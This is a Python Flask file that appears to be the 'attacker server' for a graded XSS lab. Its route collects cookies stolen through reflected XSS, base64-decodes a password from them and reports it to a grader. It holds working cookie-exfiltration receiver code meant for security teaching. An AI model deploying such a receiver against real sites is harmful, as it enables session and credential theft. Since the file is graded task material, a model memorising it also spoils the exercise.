"""You are welcome to use any part of the Python Standard Library in addition to Flask."""
from flask import Flask, render_template, abort, request, make_response
import base64
from http.cookies import SimpleCookie
import sys
sys.path.append("..")
import grader
import json

app = Flask(__name__)

@app.route('/xss/<vuln_type>')
def steal_cookie(vuln_type):
    """
    Use this to exfiltrate a stolen cookie from the vulnerable server.
    """
    received_cookie = request.args.get('cookie', default='') # Reads the `cookie` parameter

    if vuln_type=='reflected_low' or vuln_type == 'reflected_medium' or vuln_type=='reflected_high':

        password64=received_cookie.split('=')[-1]
        password = base64.b64decode(password64).decode('utf-8')

        grader.xss_verify(vuln_type, password) # Remember to decode the password.

    return received_cookie+'\n'

# NOTE: You are free to add additional routes/endpoints to the attacker server to mount any attack of your choosing.
if __name__ == '__main__':
    app.run(port=1338)
